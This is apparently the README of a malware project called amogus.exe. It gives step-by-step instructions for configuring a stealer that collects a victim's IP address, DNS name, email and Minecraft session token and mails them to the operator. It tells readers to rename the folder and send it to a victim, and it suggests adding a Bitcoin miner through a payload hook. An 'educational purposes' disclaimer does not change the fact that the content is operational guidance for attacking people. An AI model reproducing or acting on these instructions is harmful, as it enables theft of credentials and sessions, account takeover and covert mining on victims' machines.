# amogus.exe

## DISCLAIMER
*THIS SOFTWARE WAS MADE FOR EDUCATIONAL PURPOSES ONLY*

**BY USING THIS SOFTWARE, YOU AGREE,
THAT YOU WILL ONLY USE THIS SOFTWARE FOR EDUCATIONAL
PURPOSES, AND THAT YOU TAKE ALL RESPONSIBILITY
OF YOUR ACTIONS BY YOURSELF**

**YOU. HAVE. BEEN. WARNED.**

## QUICK INFO

This virus can be configured to be blatant and non-blatant. However, blatant virus can be detected by some antiviruses.

Also it:

* Gets device IP address
* Gets device DNS name
* Gets possible user email
* If minecraft is installed, gets username, uuid and __session id__
* Sends all the following data to your email

## INSTALLATION

Follow these steps to configure this virus.

1. Create throwaway email. You should create new email, if you use your existing email, *i am not responsible for anything that can happen with it*. From this email, all the messages will be sent.
2. Create another email. To this email, all the messages will be sent. To make it possible to receive messages, go to https://myaccount.google.com/lesssecureapps and allow less secure applications.
3. Download latest release in releases.
4. Open Configurator folder and launch AEXEC.exe (Stands for AmogusEXEConfigurator), and enter requested data:
It should look like this: [image](/AmogusEXE/img/console.png)
5. After everything is configured, you will see `data.enc` and `data` files created at current directory. Go to Virus directory, then to exec directory. Copy files there.
6. Then, you can send Virus folder (Obviously renamed) to victim. When victim launches the amogus.bat or AmogusEXE.exe, you will receive email with data.

## ADVANCED

If it is not enough for you, and you want to include your own payload here, e.g. BTC miner, do this.

1. Copy repository: `> git clone https://github.com/Maxuss/amongvirus.git `
2. Go to cloned repository folder, and navigate to Malware/Custom folder.
3. You will see `Payload.cs` file here. Open it with your IDE.

It should have following code:
```csharp
namespace AmogusEXE.Malware.Custom
{
    public sealed class Payload
    {
        
        /// <summary>
        /// This method will be executed on load, so you can add anything you want here
        /// </summary>
        public void Load()
        {
            // YOUR CODE HERE
        }
    }
}
```
Now you can include your own code. The `Load()` void method will be called at the start of virus.

That's it! Enjoy this software!